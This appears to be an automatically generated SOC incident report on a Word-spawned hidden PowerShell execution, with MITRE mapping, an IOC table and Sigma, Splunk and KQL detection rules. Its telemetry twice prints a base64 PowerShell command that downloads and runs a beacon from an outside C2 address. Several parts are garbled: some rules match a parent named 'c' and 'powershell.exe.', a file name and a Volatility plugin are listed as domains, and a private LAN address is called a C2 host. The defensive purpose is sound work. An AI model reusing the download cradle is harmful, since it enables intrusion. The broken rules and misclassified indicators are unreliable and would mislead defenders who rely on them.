# Technical SOC Incident Report
**Case Identifier:** CASE-TEST-001  
**System Risk Level:** `99%`  

## Mapped Cyber Kill Chain

#### Finding: Office Application Spawned Shell Process (Potential Phishing Execution)
- **MITRE Technique Mapping**: T1566.001
- **Confidence Rating**: `99%`
- **Corroborating Evidence**: EVTX Process Event Log (EID 4688/1), Prefetch Execution Cache (PECmd), Volatility Memory Dump Analysis
- **Telemetry Details**: `Parent: c:\program files\microsoft office\office16\winword.exe spawned: powershell.exe. CommandLine: powershell.exe -nop -w hidden -enc aWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTg1LjIyMC4xMDEuNDcvYmVhY29uJykuLi4=`
- **Process ID**: 4821

#### Finding: High-entropy command-line argument (Potential obfuscation/base64 payload)
- **MITRE Technique Mapping**: T1027
- **Confidence Rating**: `98%`
- **Corroborating Evidence**: EVTX Process Event Log (EID 4688/1), Prefetch Execution Cache (PECmd), Volatility Memory Dump Analysis
- **Telemetry Details**: `Entropy score: 5.55. Argument: 'aWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQp...'. Full command: powershell.exe -nop -w hidden -enc aWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTg1LjIyMC4xMDEuNDcvYmVhY29uJykuLi4=`
- **Process ID**: 4821


## Indicators of Compromise (Defanged)
| Indicator | Type | VT Score | Shodan Ports | Category |
|---|---|---|---|---|
| `invoice[.]docx` | Domain | 0/72 | None | unknown |
| `185[.]220[.]101[.]47` | IP | 58/72 | 80, 443, 50050 | Cobalt Strike C2 Beacon |
| `windows[.]pslist` | Domain | 0/72 | None | unknown |
| `192[.]168[.]1[.]105` | IP | 0/72 | None | unknown |


## Mapped Detection Engineering Coverage

### Rule: Custom_Detect_powershell._Spawned_By_c_Sigma (Sigma)
```yaml
title: Custom Detection of powershell.exe. Spawns
id: 85fd030a9c01f69a8919b1710a3c570e
status: production
description: Automatically generated rule to detect suspicious spawns of powershell.exe. from c
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    ParentImage|endswith: '\c'
    Image|endswith: '\powershell.exe.'
  condition: selection
level: critical
tags:
  - attack.execution
```

### Rule: Custom_Detect_powershell._Spawned_By_c_Splunk (Splunk)
```yaml
index=windows sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 ParentImage="*\\c" Image="*\\powershell.exe."
```

### Rule: Custom_Detect_powershell._Spawned_By_c_KQL (KQL)
```yaml
SecurityEvent | where EventID == 4688 and ParentProcessName endswith "c" and ProcessName endswith "powershell.exe."
```

### Rule: Custom_Detect_powershell_Spawned_By_winword_Sigma (Sigma)
```yaml
title: Custom Detection of powershell.exe Spawns
id: 1a73997cc8fa4c5ebda7e45ebec50151
status: production
description: Automatically generated rule to detect suspicious spawns of powershell.exe from winword.exe
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    ParentImage|endswith: '\winword.exe'
    Image|endswith: '\powershell.exe'
  condition: selection
level: critical
tags:
  - attack.execution
```

### Rule: Custom_Detect_powershell_Spawned_By_winword_Splunk (Splunk)
```yaml
index=windows sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 ParentImage="*\\winword.exe" Image="*\\powershell.exe"
```

### Rule: Custom_Detect_powershell_Spawned_By_winword_KQL (KQL)
```yaml
SecurityEvent | where EventID == 4688 and ParentProcessName endswith "winword.exe" and ProcessName endswith "powershell.exe"
```

### Rule: Custom_Block_Outbound_C2_185_220_101_47_Sigma (Sigma)
```yaml
title: Network Connection to Malicious C2 Host 185.220.101.47
id: cc24d0ba07b3b1e8eb1383d6d1956cca
status: production
description: Detects outbound TCP connection to identified C2 address 185.220.101.47
logsource:
  category: network_connection
  product: windows
detection:
  selection:
    DestinationIp: '185.220.101.47'
  condition: selection
level: critical
tags:
  - attack.command_and_control
```

### Rule: Custom_Block_Outbound_C2_185_220_101_47_Splunk (Splunk)
```yaml
index=windows sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=3 DestinationIp="185.220.101.47"
```

### Rule: Custom_Block_Outbound_C2_185_220_101_47_KQL (KQL)
```yaml
DeviceNetworkEvents | where RemoteIP == "185.220.101.47"
```

### Rule: Custom_Block_Outbound_C2_192_168_1_105_Sigma (Sigma)
```yaml
title: Network Connection to Malicious C2 Host 192.168.1.105
id: 0138735dc27090512400e8c3b0e18fa1
status: production
description: Detects outbound TCP connection to identified C2 address 192.168.1.105
logsource:
  category: network_connection
  product: windows
detection:
  selection:
    DestinationIp: '192.168.1.105'
  condition: selection
level: critical
tags:
  - attack.command_and_control
```

### Rule: Custom_Block_Outbound_C2_192_168_1_105_Splunk (Splunk)
```yaml
index=windows sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=3 DestinationIp="192.168.1.105"
```

### Rule: Custom_Block_Outbound_C2_192_168_1_105_KQL (KQL)
```yaml
DeviceNetworkEvents | where RemoteIP == "192.168.1.105"
```

